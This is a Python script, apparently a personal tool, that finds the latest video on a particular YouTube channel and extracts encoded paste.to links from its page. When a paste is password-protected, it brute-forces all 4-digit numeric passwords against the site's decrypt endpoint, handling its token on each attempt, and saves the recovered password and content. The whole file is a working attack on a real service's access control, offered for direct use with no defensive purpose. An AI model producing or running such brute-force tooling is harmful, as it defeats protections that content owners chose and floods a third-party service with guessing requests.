import requests
import re
from datetime import datetime
from urllib.parse import urljoin, unquote
from itertools import product
import time
import json

def get_youtube_content(url):
    """获取YouTube页面内容"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    try:
        response = requests.get(url, headers=headers, timeout=15)
        response.raise_for_status()
        return response.text
    except Exception as e:
        print(f"获取内容失败: {str(e)}")
        return None

def check_password_protected(content):
    """检查页面是否需要密码"""
    return 'password-protected' in content.lower() or '请输入这份粘贴内容的密码' in content

def decrypt_paste_content(url, password):
    """使用密码解密paste.to内容"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    try:
        # 首先获取页面以获取token
        session = requests.Session()
        response = session.get(url, headers=headers, timeout=15)
        response.raise_for_status()
        
        # 从页面中提取token
        token_match = re.search(r'name="token"\s+value="([^"]+)"', response.text)
        if not token_match:
            print("无法获取token")
            return None
        
        token = token_match.group(1)
        
        # 构造解密请求
        decrypt_url = url.rstrip('/') + '/?paste'
        data = {
            'password': password,
            'token': token
        }
        
        response = session.post(decrypt_url, headers=headers, data=data, timeout=15)
        response.raise_for_status()
        
        # 解析返回的JSON数据
        result = response.json()
        if result.get('status') == 0:
            return result.get('data')  # 返回解密后的内容
        else:
            error_msg = result.get('message', '未知错误')
            if '错误的密码' in error_msg:
                return None  # 密码错误
            print(f"解密失败: {error_msg}")
            return None
            
    except Exception as e:
        print(f"解密过程中出错: {str(e)}")
        return None

def brute_force_paste(url):
    """暴力破解4位数字密码"""
    print(f"\n开始暴力破解paste.to链接: {url}")
    print("密码规则: 4位数字(0000-9999)")
    
    # 生成所有可能的4位数字组合
    digits = '0123456789'
    total = len(digits) ** 4
    attempts = 0
    start_time = time.time()
    
    for combo in product(digits, repeat=4):
        password = ''.join(combo)
        attempts += 1
        
        # 每尝试100次打印一次进度
        if attempts % 100 == 0:
            elapsed = time.time() - start_time
            print(f"尝试进度: {attempts}/{total} ({(attempts/total)*100:.1f}%), 已用时: {elapsed:.1f}秒, 当前尝试: {password}")
        
        content = decrypt_paste_content(url, password)
        
        if content is not None:
            elapsed = time.time() - start_time
            print(f"\n破解成功! 密码: {password}")
            print(f"总尝试次数: {attempts}, 总用时: {elapsed:.1f}秒")
            print("\n获取到的内容:")
            print("-" * 50)
            print(content)
            print("-" * 50)
            return password, content
    
    print("\n暴力破解完成，未找到正确密码")
    return None, None

def find_latest_video(channel_url):
    """查找最新日期的视频"""
    content = get_youtube_content(channel_url)
    if not content:
        return None

    # 匹配日期格式的视频
    date_pattern = re.compile(r'(\d{4}年\d{1,2}月\d{1,2}日).*?"url":"(/watch\?v=[^"]+)"')
    matches = date_pattern.finditer(content)
    
    videos = []
    for match in matches:
        date_str = match.group(1)
        video_path = match.group(2)
        video_url = urljoin('https://www.youtube.com', video_path)
        
        try:
            date_obj = datetime.strptime(date_str, '%Y年%m月%d日')
            videos.append({
                'date_str': date_str,
                'date_obj': date_obj,
                'url': video_url
            })
        except ValueError:
            continue
    
    if not videos:
        return None
    
    # 按日期排序获取最新视频
    videos.sort(key=lambda x: x['date_obj'], reverse=True)
    return videos[0]

def extract_encoded_paste_links(content):
    """精确查找编码后的paste.to链接"""
    print("正在搜索编码后的paste.to链接...")
    links = []
    
    # 查找所有编码后的paste.to链接
    matches = re.finditer(r'https%3A%2F%2Fpaste\.to[^\\\s]+', content)
    
    for match in matches:
        encoded_url = match.group()
        try:
            # URL解码
            decoded_url = unquote(encoded_url)
            links.append(decoded_url)
            print(f"找到编码链接: {encoded_url} -> 解码后: {decoded_url}")
        except Exception as e:
            print(f"解码失败: {encoded_url}, 错误: {str(e)}")
    
    return links

def main():
    channel_url = "https://www.youtube.com/@ZYFXS"
    
    print("正在查找最新视频...")
    latest_video = find_latest_video(channel_url)
    if not latest_video:
        print("未找到符合条件的视频")
        return
    
    print(f"\n找到最新视频: {latest_video['date_str']}")
    print(f"视频链接: {latest_video['url']}")
    
    print("\n正在获取视频页面内容...")
    content = get_youtube_content(latest_video['url'])
    if not content:
        print("无法获取页面内容")
        return
    
    print("正在精确搜索编码后的paste.to链接...")
    paste_links = extract_encoded_paste_links(content)
    
    if paste_links:
        print("\n找到的paste.to链接:")
        for i, link in enumerate(paste_links, 1):
            print(f"{i}. {link}")
        
        # 访问第一个找到的paste.to链接
        first_paste_link = paste_links[0]
        print(f"\n正在访问第一个paste.to链接: {first_paste_link}")
        
        # 检查是否需要密码
        initial_content = requests.get(first_paste_link).text
        if check_password_protected(initial_content):
            print("\n该paste.to内容受密码保护，开始暴力破解...")
            password, content = brute_force_paste(first_paste_link)
            
            if password:
                # 保存结果到文件
                with open('paste_result.txt', 'w', encoding='utf-8') as f:
                    f.write(f"URL: {first_paste_link}\n")
                    f.write(f"Password: {password}\n")
                    f.write("Content:\n")
                    f.write(content)
                print("\n结果已保存到 paste_result.txt")
        else:
            print("\n该paste.to内容不需要密码")
            # 这里可以添加处理无密码内容的逻辑
    else:
        print("\n未找到paste.to链接")

if __name__ == "__main__":
    main()
